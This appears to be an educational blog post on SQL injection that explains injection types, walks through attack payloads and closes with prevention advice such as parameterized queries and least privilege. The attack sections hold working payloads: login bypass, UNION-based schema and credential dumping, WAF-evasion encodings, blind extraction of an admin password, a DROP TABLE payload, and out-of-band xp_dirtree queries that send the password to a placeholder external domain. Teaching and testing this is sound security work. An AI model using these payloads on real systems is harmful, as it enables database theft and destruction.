@@ -1,0 +1,359 @@
+Mastering SQL Injection: From Basics to Real-World Exploitation and Prevention
+Introduction
+SQLi is the most dangerous and most exploited web vulnerability in the world of cybersecurity. It ranks high on the OWASP Top 10 because it can lead to data leaks, login bypass, or full database compromise.
+
+Before we learn what SQL Injection is and how to exploit and prevent it, let's understand the basic concept of SQL and how it works.
+
+📌 What is SQL?
+SQL (Structured Query Language) is a standard language that is used to communicate with relational databases. It allows the application to store, update, retrieve, and delete data.
+
+It's used in almost every web application, whether it's a social media site storing your posts and information or a banking app.
+
+SQL works with databases that store data in tables (rows and columns), using queries:
+
+INSERT – This query is used to create or add new data to the table.
+
+SELECT – This query is used to read or to retrieve data.
+
+UPDATE – This query is used to update or modify existing records.
+
+DELETE – This query is used to remove or delete the data from the table.
+
+💡 Why SQL is So Widely Used
+It is easy to learn.
+
+It can handle large datasets with simple commands.
+
+It works with MySQL, PostgreSQL, Oracle, SQL Server, etc.
+
+It can be used in small or large-scale applications.
+
+🚨 Introduction of SQL Injection
+SQL is a powerful tool, but sometimes it can be dangerous when user input is directly inserted into queries without validation and sanitization.
+
+This allows an attacker to inject malicious SQL code — referred to as SQL Injection (SQLi).
+
+SQLi is a type of vulnerability where an attacker manipulates SQL queries by injecting malicious input into the input fields.
+This can cause:
+
+Unauthorized data access
+
+Login bypass
+
+Full database dumping
+
+Remote code execution
+
+💣 Types of SQL Injection (SQLi)
+There are different types of SQLi. It depends on how the application responds to the injected input. Let's understand this...
+
+1. Classic SQL Injection (Error-based / UNION-based)
+Occurs when the application reflects error messages or results. It's easy to detect and exploit.
+
+Example:
+
+plaintext
+Copy
+Edit
+Username: ' OR 1=1 --
+Password: [blank]
+System thinks 1=1 is always true, so it logs you in.
+
+2. Blind SQL Injection
+When the app doesn't show errors, but you can detect behavior changes. There are 2 types:
+
+a. Boolean-based
+plaintext
+Copy
+Edit
+' AND 1=1--   → Valid page  
+' AND 1=2--   → Error or blank page
+Example:
+Sam tries:
+
+plaintext
+Copy
+Edit
+' AND 1=1 --    ✅ Sandwich found  
+' AND 1=2 --    ❌ Sandwich not found
+b. Time-based
+plaintext
+Copy
+Edit
+' OR SLEEP(5)--
+If the page delays, it's vulnerable.
+
+Example:
+Alle injects:
+
+sql
+Copy
+Edit
+'; IF(1=1, SLEEP(5), 0) --
+If the blog takes 5 seconds to load — it’s vulnerable.
+
+3. Out-of-Band SQL Injection (OAST)
+Used when you can't detect response or timing differences. You trigger DNS or HTTP requests to a server you control.
+
+Payload:
+
+sql
+Copy
+Edit
+'; exec master..xp_dirtree '//your-subdomain.burpcollaborator.net/a'--
+Example:
+Using:
+
+sql
+Copy
+Edit
+'; exec xp_dirtree '\\bughunter.oast.live\share'--
+You get a DNS request on your listener — confirms vulnerability.
+
+4. Second-Order SQL Injection
+You inject a payload that gets stored and is later used in a vulnerable SQL query.
+
+Example:
+Sign up with:
+
+plaintext
+Copy
+Edit
+Name = admin'--
+Later, query becomes:
+
+sql
+Copy
+Edit
+SELECT * FROM users WHERE username = 'admin'--'
+It shows admin's data instead of yours.
+
+5. SQLi in Different Contexts (Headers, JSON, XML)
+Inputs may come from:
+
+Cookies
+
+Headers
+
+JSON payloads
+
+XML requests
+
+Example:
+XML:
+
+xml
+Copy
+Edit
+<storeId>
+    999 &#x53;ELECT * FROM users
+</storeId>
+Here, &#x53; = "S", bypassing WAFs.
+
+💥 Exploiting SQL Injection: From Basics to Advanced
+1. Classic SQL Injection
+a. Login Bypass (Authentication bypass)
+Normal query:
+
+sql
+Copy
+Edit
+SELECT * FROM users WHERE username = 'ananya' AND password = '123456';
+Injection:
+
+plaintext
+Copy
+Edit
+Username: ' OR '1'='1
+Password: [any]
+Becomes:
+
+sql
+Copy
+Edit
+SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '[anything]';
+b. Error-Based SQL Injection
+sql
+Copy
+Edit
+' AND 1=CAST((SELECT @@version) AS INT)--
+Forces error → leaks DB version.
+
+c. UNION-Based SQL Injection
+Normal query:
+
+sql
+Copy
+Edit
+SELECT name, description FROM products WHERE category = 'Gifts';
+Payload:
+
+sql
+Copy
+Edit
+' UNION SELECT NULL, username FROM users--
+Shows usernames.
+
+Find column count:
+
+sql
+Copy
+Edit
+' ORDER BY 1--  
+' ORDER BY 2--  
+' ORDER BY 3--  
+Test column reflection:
+
+sql
+Copy
+Edit
+' UNION SELECT NULL, 'test'--
+Info schema discovery:
+
+sql
+Copy
+Edit
+' UNION SELECT NULL, table_name FROM information_schema.tables--
+
+' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = 'users'--
+
+' UNION SELECT NULL, username FROM users--
+d. WAF Bypass & Obfuscation
+Techniques:
+
+Inline Comments
+
+sql
+Copy
+Edit
+'/**/OR/**/1=1-- 
+Changing Case
+
+sql
+Copy
+Edit
+oR 1=1
+URL Encoding
+
+plaintext
+Copy
+Edit
+%27%20OR%201=1--  
+String Concatenation
+
+sql
+Copy
+Edit
+CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110) -- 'admin'
+Hex Encoding
+
+sql
+Copy
+Edit
+username = 0x61646d696e
+Whitespace Bypass
+
+sql
+Copy
+Edit
+S/**/E/**/L/**/E/**/C/**/T
+2. Blind SQL Injection
+a. Boolean-Based Blind SQLi
+sql
+Copy
+Edit
+' AND 1=1--     → True  
+' AND 1=2--     → False
+Extract character by character:
+
+sql
+Copy
+Edit
+' AND SUBSTRING((SELECT username FROM users WHERE role='admin'),1,1)='a'--
+b. Time-Based Blind SQLi
+sql
+Copy
+Edit
+' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--
+If it pauses — char is correct.
+
+c. Out-of-Band (OAST) Blind SQLi
+sql
+Copy
+Edit
+'; declare @p varchar(1024); 
+   set @p=(SELECT password FROM users WHERE username='admin'); 
+   exec('master..xp_dirtree "//'+@p+'.yourdomain.net/a"')-- 
+DNS request confirms it.
+
+3. Second-Order SQL Injection
+Payload stored in profile:
+
+plaintext
+Copy
+Edit
+qwert'; DROP TABLE users;--
+Later used in a query:
+
+sql
+Copy
+Edit
+SELECT * FROM logs WHERE username = 'qwert'; DROP TABLE users;--';
+The users table is dropped.
+
+🔐 How to Prevent SQL Injection
+a. Use parameterized queries (prepared statements)
+Unsafe:
+
+python
+Copy
+Edit
+query = "SELECT * FROM users WHERE username = '" + user_input + "'"
+Safe:
+
+python
+Copy
+Edit
+cursor.execute("SELECT * FROM users WHERE username = %s", (user_input,))
+b. Validate and Sanitize Input
+Use whitelisting (only allow expected values).
+
+Avoid blacklisting.
+
+Reject characters like ', ;, -- if not needed.
+
+c. Limit Database Privileges
+Use least privilege.
+
+Login form? Only need SELECT.
+
+Never allow DROP, ALTER, or ADMIN actions.
+
+d. Use Web Application Firewall (WAF)
+Helps detect/block known payloads.
+
+But don’t rely solely on it.
+
+e. Log, Monitor, and Alert
+Monitor for anomalies like repeated login bypass attempts or delayed responses.
+
+Use SIEMs for alerts.
+
+f. Stay Updated
+Always use latest versions.
+
+Apply security patches.
+
+✅ Conclusion
+SQL Injection is one of the oldest yet still most dangerous web application vulnerabilities. From login bypasses to advanced blind and second-order attacks, SQLi gives attackers many ways to compromise systems.
+
+What makes it scary?
+It hides in plain sight. One small input-handling mistake could expose your entire database.
+
+Good news?
+SQLi is completely preventable — with parameterized queries, validation, access controls, and best practices.
+
+💬 In the next blog: I’ll cover Authentication Vulnerabilities — where attackers bypass logins, hijack sessions, or exploit weak password policies.
+
+Stay tuned!
+If you liked this blog or learned something new, drop a comment or share it with your fellow devs & bug hunters 👩‍💻👨‍💻
